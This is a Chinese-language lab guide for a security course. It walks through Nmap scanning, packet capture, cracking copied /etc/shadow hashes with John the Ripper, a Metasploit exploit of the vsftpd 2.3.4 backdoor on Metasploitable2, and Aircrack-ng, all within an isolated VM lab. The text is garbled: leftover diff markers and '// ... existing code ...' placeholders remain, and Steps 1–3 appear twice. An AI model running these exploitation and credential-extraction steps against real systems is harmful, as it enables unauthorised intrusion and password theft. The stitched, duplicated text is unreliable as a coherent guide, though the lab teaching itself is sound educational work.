# 实验指南：讨论、评估并演示五款开源安全工具

作者：GuYi  
环境：VMware Workstation Pro 17（Windows 主机）、Kali Linux（攻击者 VM）、Metasploitable2/DVWA（靶机 VM）

## 实验目标
- 讨论、评估并演示黑客与安全测试人员常用的五款开源工具：Nmap、Wireshark/tcpdump、Metasploit Framework、John the Ripper、Aircrack-ng。
- 所有操作仅限在隔离、已授权的实验环境中进行，严禁在生产或第三方networks测试。
- 为每一步收集可复现的证据（截图、日志）。

## 安全与范围
- 网络隔离：VM 网络设置为 `Host-only` 或 `NAT`，严禁桥接至生产局域网。
- 授权：所有靶机均为你可控的实验 VM，已获得课程/教师许可。
- 快照：在渗透前为 Kali 与靶机创建快照；演示结束后可回滚。

## 实验拓扑
- 攻击机：Kali Linux VM（工具预装或可通过 `apt` 获取）。
- 靶机：Metasploitable2（含多种漏洞服务）及可选 DVWA（Web 应用演示）。
- 连接：确保 Kali ↔ 靶机 IP 可达。

### 证据目录与命名
- 在项目根目录下创建文件夹 `assignment/screenshots/` 用于存放所有截图。
- 采用命名规范：`NN-Category-Detail.png`（仅英文，NN 为两位序号）。
- 示例分类：`Env`、`Nmap`、`Wireshark`、`Metasploit`、`John`、`Aircrack`、`Hardening`。

---

## Step 0 — 环境准备（必做）
1) 导入/启动靶机：Metasploitable2 和/或 DVWA（Docker/VM）。  
2) 将 VM 网络设置为 `Host-only` 或 `NAT`；确保 Kali 能 ping 通靶机 IP。  
3) 为 Kali 与靶机创建快照。

需拍摄的截图：
- `01-Env-VM-List.png`：VMware 库中显示 Kali 与靶机均已导入。  
- `02-Env-IP-Check.png`：Kali 终端展示 `ip a` / `ip addr` 以及 `ping 192.168.126.133` 成功。

---

## Step 1 — 使用 Nmap 进行基线枚举（必做）

目标：发现存活主机、开放端口、服务及操作系统指纹。

在 Kali 中执行命令：
```bash
# 主机探测（根据网络情况调整）
nmap -sn 192.168.126.133

# 全端口 TCP 扫描，检测服务与 OS
nmap -sV -O -p- -T4 192.168.126.133

# 漏洞扫描（可选）
nmap --script=vuln -Pn 192.168.126.133

示例输出（参考）：
```text
Nmap scan report for 192.168.126.133
Host is up (0.00036s latency).
MAC Address: 00:0C:29:FA:DD:2A (VMware)
Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
```
```

需捕获的内容：
- `10-Nmap-Discovery.png`：主机存活探测输出。  
- `11-Nmap-Services-Versions.png`：开放端口及服务版本（如 vsftpd 2.3.4、MySQL、Tomcat）。  
- `12-Nmap-Vuln-Scripts.png`：部分 NSE 结果及简要注释（若检测到漏洞）。

评估要点：
- 优点：扫描速度快、脚本丰富、指纹准确。  
- 缺点：噪声大；在真实网络中可能触发 IDS/IPS；需获得授权。

---

## Step 2 — 流量捕获与分析（Wireshark/tcpdump）（必做）

目标：观察扫描和应用操作产生的网络流量模式。

在 Kali 中执行：
```bash
# 确认网卡（如 eth0）
ip a

# 在执行 Nmap 扫描期间抓包（下列示例以 eth0 为例，如你的接口名不同请自行替换）
-sudo tcpdump -i <iface> -w scan.pcap
+sudo tcpdump -i eth0 -w scan.pcap  # 需要 root 权限，否则会提示 Operation not permitted
# 在 tcpdump 运行时执行 Nmap 扫描
# 扫描完成后，Ctrl+C 结束抓包

# 在 Wireshark 中打开 pcap
wireshark scan.pcap &
```

Wireshark 过滤器演示：
- `tcp.flags.syn == 1 and tcp.flags.ack == 0` （端口扫描初始 SYN）
- `tcp.flags.ack == 1 and tcp.flags.syn == 1` （SYN+ACK 响应）
- DVWA 登录演示：`http.request.method == "POST"`（仅适用于 HTTP）

需拍摄的截图：
- `20-Tcpdump-Capture-Start.png`：终端显示 tcpdump 正在抓包。  
- `21-Tcpdump-Capture-Stop.png`：抓包结束后终端显示包统计信息。  
- `22-Wireshark-Scan-Pattern.png`：过滤视图高亮 SYN 扫描流量。  
- `23-Wireshark-HTTP-POST.png`：DVWA 登录 POST 请求（如有演示）。

评估要点：
- 优点：深度可视化，协议解析能力强，便于防御方分析。  
- 缺点：需高权限；可能暴露敏感数据；加密流量限制可见性。

---

## Step 3 — 使用 John the Ripper 进行密码破解（必做，仅限实验）

目标：演示弱密码风险及负责任的测试方法。

前期准备（靶机上完成，仅限实验账户）：
```bash
# 创建弱口令测试用户（在靶机）
sudo useradd testuser
sudo passwd testuser   # 例如设置为: password123

// ... existing code ...

// ... existing code ...
-# 导出哈希（在靶机）
-sudo unshadow /etc/passwd /etc/shadow > /tmp/lab_shadow.txt
+# 导出哈希
+## 方案 A（推荐）：直接复制两个文件到 Kali，再合并
+# 在靶机（Metasploitable2）
+sudo cp /etc/passwd /tmp/
+sudo cp /etc/shadow /tmp/
+
+# 然后将这两个文件通过 SCP / 共享文件夹等方式拷贝到 Kali。
+# 在 Kali（已预装 john）上执行：
+unshadow passwd shadow > lab_shadow.txt
+
+## 方案 B：在靶机本地使用 unshadow（需先安装 john）
+# 如果靶机可以联网且有 apt 源，可先安装 john：
+sudo apt-get update && sudo apt-get -y install john
+
+# 然后在靶机直接合并：
+sudo unshadow /etc/passwd /etc/shadow > /tmp/lab_shadow.txt
+> **如遇 “/usr/share/wordlists/rockyou.txt: No such file or directory”**
+>
+> Kali 默认只提供压缩版 `rockyou.txt.gz`，或在最小化安装中未自带字典，按需执行：
+>
+> ```bash
+> # 方案 1：安装 wordlists 套件（含 rockyou）
+> sudo apt-get update && sudo apt-get -y install wordlists
+>
+> # 方案 2：若已存在压缩包，则解压即可
+> sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+> ```
+>
+> 解压后再次运行：
+> ```bash
+> john --wordlist=/usr/share/wordlists/rockyou.txt lab_shadow.txt
+> ```
+>
+> 若仍提示格式警告（`md5crypt-long`），一般可忽略或显式指定：
+> ```bash
+> john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt lab_shadow.txt
+> ```
+# 复制示例（若 Kali 的 OpenSSH 版本较新，可能因算法不兼容导致 “no matching host key type” 错误，可添加兼容参数）：
+```bash
+# 在 Kali 里执行，-o 选项用于临时启用旧算法
+scp -oKexAlgorithms=+diffie-hellman-group1-sha1 \
+    -oHostKeyAlgorithms=+ssh-rsa \
+    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
+    msfadmin@192.168.126.133:/tmp/{passwd,shadow} .
+```
+
+如果仍然报错，可改用以下替代方案（任选其一）：
+1. **使用 FTP/TFTP**：Metasploitable2 默认开启 `vsftpd`，可用 `ftp` 登录并下载文件。
+2. **使用 Python 简易 HTTP 服务器**（靶机安装有 Python2）：
+   ```bash
+   # 在靶机 /tmp 目录下
+   cd /tmp && python -m SimpleHTTPServer 8000 &
+   # 在 Kali 下载
+   wget http://192.168.126.133:8000/passwd
+   wget http://192.168.126.133:8000/shadow
+   ```
+3. **共享文件夹**：若两台虚拟机处于同一虚拟网络，可用宿主机共享目录或拖拽文件实现。
+
+需拍摄的截图：
+- `3-p-pw&shadow.png`：在 Kali 终端中显示已成功导入靶机的 `passwd` 与 `shadow` 文件。
 - `30-John-Run.png`：John 使用字典运行，显示进度与候选口令。  
 - `31-John-Show.png`：`john --show` 输出已破解的凭据。

评估要点：
- 优点：破解能力强，支持多种哈希格式。  
- 缺点：涉及法律/伦理；仅限授权账户。

---

## Step 4 — 使用 Metasploit 进行受控漏洞利用（必做）

目标：在**攻击机 Kali** 上利用靶机 **Metasploitable 2** 所带的 `vsftpd 2.3.4` 后门，获取交互式 shell。

> ⚠ **仅限授权环境！请勿将以下操作用于任何未经授权的系统。**

### 4.1 前置侦察（攻击机 Kali）
为了确认靶机 21 端口确实运行易受攻击的版本，可先执行：
```bash
# [攻击机 Kali]
# 扫描 21 端口服务及版本
nmap -sV -p 21 192.168.126.133
+# 如长时间无输出或提示主机不在线，可尝试：
+# 1) 增加 `-v` 观察进度；
+# 2) 使用 `-Pn` 跳过 Ping 检测（目标可能丢弃 ICMP）；
+# 3) 加上 `-n` 关闭 DNS 反向解析以防阻塞；
+# 4) 确认网络连通：`ping 192.168.126.133` 或 `nc -vz 192.168.126.133 21`。
+# 例如：
+# nmap -sV -p 21 -Pn -n -v 192.168.126.133
期望输出包含 `vsftpd 2.3.4` 字样。

### 4.2 加载与配置 Metasploit 模块（攻击机 Kali）
```bash
# [攻击机 Kali] 启动 Metasploit 控制台
msfconsole

# 以下均在 msf6 提示符下执行
msf6 > search vsftpd 2.3.4                # 搜索对应漏洞模块
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# 设置目标地址（替换为你的靶机 IP）
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.126.133
msf6 exploit(vsftpd_234_backdoor) > set RPORT 21                 # 默认即 21，可省略

# （可选）指定 Payload，默认已是 cmd/unix/interact
# msf6 exploit(vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact

# 执行漏洞利用
msf6 exploit(vsftpd_234_backdoor) > run
```
如果一切顺利，你将看到：
```
[*] 192.168.126.133:21 - Banner: 220 (vsFTPd 2.3.4)
[+] 192.168.126.133:21 - Backdoor service has been spawned, handling...
[*] Command shell session 1 opened (192.168.126.128:4444 -> 192.168.126.133:6200) at 2024-XX-XX XX:XX:XX +0000
```

### 4.3 会话交互与验证（攻击机 Kali）
在取得的 shell 中可以执行简单命令验证权限（此为受限 shell，权限通常为 `nobody`）：
```bash
id
uname -a
cat /etc/issue
```

### 4.4 清理与退出
```bash
# [攻击机 Kali] 在 Metasploit 中关闭当前会话
exit                # 退出 shell
sessions -K         # （可选）终止全部会话
```

在**靶机 Metasploitable 2** 上无需执行任何命令，但演示结束后可考虑：
1. 停止或卸载易受攻击的 `vsftpd` 服务：
   ```bash
   # [靶机]
   sudo service vsftpd stop   # 或通过 inetd/xinetd 关闭相关条目
   ```
2. 查看 `/var/log/vsftpd.log` 了解后门触发痕迹。

### 4.5 需拍摄的截图
- `40-Metasploit-Module.png`：搜索并载入模块、完成参数配置（攻击机）。
- `41-Metasploit-Session.png`：成功建立 shell 会话并执行 `id` 等命令（攻击机）。

评估要点：
- **优点**：Metasploit 提供高度自动化的漏洞利用与后渗透功能，便于安全验证。  
- **缺点**：高风险，易被误用。务必在授权、隔离环境中操作，演示后及时清理并记录日志。

---




需捕获的内容：
- `10-Nmap-Discovery.png`：主机存活探测输出。  
- `11-Nmap-Services-Versions.png`：开放端口及服务版本（如 vsftpd 2.3.4、MySQL、Tomcat）。  
- `12-Nmap-Vuln-Scripts.png`：部分 NSE 结果及简要注释（若检测到漏洞）。

评估要点：
- 优点：扫描速度快、脚本丰富、指纹准确。  
- 缺点：噪声大；在真实网络中可能触发 IDS/IPS；需获得授权。

---

## Step 2 — 流量捕获与分析（Wireshark/tcpdump）（必做）

目标：观察扫描和应用操作产生的网络流量模式。

在 Kali 中执行：
```bash
# 确认网卡（如 eth0）
ip a

# 在执行 Nmap 扫描期间抓包（下列示例以 eth0 为例，如你的接口名不同请自行替换）
-sudo tcpdump -i <iface> -w scan.pcap
+sudo tcpdump -i eth0 -w scan.pcap  # 需要 root 权限，否则会提示 Operation not permitted
# 在 tcpdump 运行时执行 Nmap 扫描
# 扫描完成后，Ctrl+C 结束抓包

# 在 Wireshark 中打开 pcap
wireshark scan.pcap &
```

Wireshark 过滤器演示：
- `tcp.flags.syn == 1 and tcp.flags.ack == 0` （端口扫描初始 SYN）
- `tcp.flags.ack == 1 and tcp.flags.syn == 1` （SYN+ACK 响应）
- DVWA 登录演示：`http.request.method == "POST"`（仅适用于 HTTP）

需拍摄的截图：
- `20-Tcpdump-Capture-Start.png`：终端显示 tcpdump 正在抓包。  
- `21-Tcpdump-Capture-Stop.png`：抓包结束后终端显示包统计信息。  
- `22-Wireshark-Scan-Pattern.png`：过滤视图高亮 SYN 扫描流量。  
- `23-Wireshark-HTTP-POST.png`：DVWA 登录 POST 请求（如有演示）。

评估要点：
- 优点：深度可视化，协议解析能力强，便于防御方分析。  
- 缺点：需高权限；可能暴露敏感数据；加密流量限制可见性。

---

## Step 3 — 使用 John the Ripper 进行密码破解（必做，仅限实验）

目标：演示弱密码风险及负责任的测试方法。

前期准备（靶机上完成，仅限实验账户）：
```bash
# 创建弱口令测试用户（在靶机）
sudo useradd testuser
sudo passwd testuser   # 例如设置为: password123

// ... existing code ...

// ... existing code ...
-# 导出哈希（在靶机）
-sudo unshadow /etc/passwd /etc/shadow > /tmp/lab_shadow.txt
+# 导出哈希
+## 方案 A（推荐）：直接复制两个文件到 Kali，再合并
+# 在靶机（Metasploitable2）
+sudo cp /etc/passwd /tmp/
+sudo cp /etc/shadow /tmp/
+
+# 然后将这两个文件通过 SCP / 共享文件夹等方式拷贝到 Kali。
+# 在 Kali（已预装 john）上执行：
+unshadow passwd shadow > lab_shadow.txt
+
+## 方案 B：在靶机本地使用 unshadow（需先安装 john）
+# 如果靶机可以联网且有 apt 源，可先安装 john：
+sudo apt-get update && sudo apt-get -y install john
+
+# 然后在靶机直接合并：
+sudo unshadow /etc/passwd /etc/shadow > /tmp/lab_shadow.txt
+> **如遇 “/usr/share/wordlists/rockyou.txt: No such file or directory”**
+>
+> Kali 默认只提供压缩版 `rockyou.txt.gz`，或在最小化安装中未自带字典，按需执行：
+>
+> ```bash
+> # 方案 1：安装 wordlists 套件（含 rockyou）
+> sudo apt-get update && sudo apt-get -y install wordlists
+>
+> # 方案 2：若已存在压缩包，则解压即可
+> sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+> ```
+>
+> 解压后再次运行：
+> ```bash
+> john --wordlist=/usr/share/wordlists/rockyou.txt lab_shadow.txt
+> ```
+>
+> 若仍提示格式警告（`md5crypt-long`），一般可忽略或显式指定：
+> ```bash
+> john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt lab_shadow.txt
+> ```
+# 复制示例（若 Kali 的 OpenSSH 版本较新，可能因算法不兼容导致 “no matching host key type” 错误，可添加兼容参数）：
+```bash
+# 在 Kali 里执行，-o 选项用于临时启用旧算法
+scp -oKexAlgorithms=+diffie-hellman-group1-sha1 \
+    -oHostKeyAlgorithms=+ssh-rsa \
+    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
+    msfadmin@192.168.126.133:/tmp/{passwd,shadow} .
+```
+
+如果仍然报错，可改用以下替代方案（任选其一）：
+1. **使用 FTP/TFTP**：Metasploitable2 默认开启 `vsftpd`，可用 `ftp` 登录并下载文件。
+2. **使用 Python 简易 HTTP 服务器**（靶机安装有 Python2）：
+   ```bash
+   # 在靶机 /tmp 目录下
+   cd /tmp && python -m SimpleHTTPServer 8000 &
+   # 在 Kali 下载
+   wget http://192.168.126.133:8000/passwd
+   wget http://192.168.126.133:8000/shadow
+   ```
+3. **共享文件夹**：若两台虚拟机处于同一虚拟网络，可用宿主机共享目录或拖拽文件实现。
+
+需拍摄的截图：
+- `3-p-pw&shadow.png`：在 Kali 终端中显示已成功导入靶机的 `passwd` 与 `shadow` 文件。
 - `30-John-Run.png`：John 使用字典运行，显示进度与候选口令。  
 - `31-John-Show.png`：`john --show` 输出已破解的凭据。

评估要点：
- 优点：破解能力强，支持多种哈希格式。  
- 缺点：涉及法律/伦理；仅限授权账户。

---

## Step 5 — 使用 Aircrack-ng 进行无线攻击链演示（推荐，可离线）

说明：由于 VM 环境通常缺乏支持监听模式的无线网卡，建议使用离线握手包进行演示。

在 Kali 中执行：
```bash
# 使用示例握手包 (handshake.pcap) 与字典文件
aircrack-ng handshake.pcap -w /usr/share/wordlists/rockyou.txt
```

需拍摄的截图：
- `50-Aircrack-Run.png`：命令执行，显示 AP/BSSID/握手状态。  
- `51-Aircrack-Result.png`：成功恢复密钥或失败原因（需说明）。

评估要点：
- 优点：广泛应用于无线渗透测试，展示 WPA/WPA2 握手攻击。  
- 缺点：硬件及法律限制；真实抓包需具备监听模式网卡并取得授权。

---

## Step 6 — 加固与再次评估（必做）

在靶机上执行的加固措施：
- 禁用/修补易受攻击的服务（如卸载 vsftpd 或升级至安全版本）。
- 应用防火墙规则（如 `ufw`/`iptables`）限制暴露面。
- 强制使用强密码并启用锁定策略。

重新测试（Kali）：
```bash
nmap -sV -O -p- -T4 <targetIP>
nmap -sV -O -p- -T4 192.168.126.133
```

需拍摄的截图：
- `60-Nmap-Rescan-After-Hardening.png`：显示开放端口减少或版本改变的结果。

---

## Step 7 — 工具对比与评估（报告部分）
在最终报告中撰写简短矩阵，对比以下方面：
- 安装复杂度、功能广度、学习曲线、输出质量、伦理/风险、典型用例。  
- 总结这些工具如何在信息收集、漏洞利用与防御环节互补。

---

## 交付物
- Markdown 实验记录（本文件）+ 所有截图（位于 `assignment/screenshots/`）。
- 可选：LaTeX/PDF 版报告，结构建议：Objectives、Environment、Methods（步骤 1–6）、Results & Discussion、Recommendations、References。
- 若可行，附加关键工件（如 `scan.pcap`、部分日志）。

## 参考文献
- Kali Linux 文档: https://www.kali.org/docs/
- Nmap 参考手册: https://nmap.org/book/man.html
- Metasploit Framework: https://docs.metasploit.com/
- John the Ripper: https://www.openwall.com/john/
- Aircrack-ng 套件: https://www.aircrack-ng.org/
- Wireshark 用户指南: https://www.wireshark.org/docs/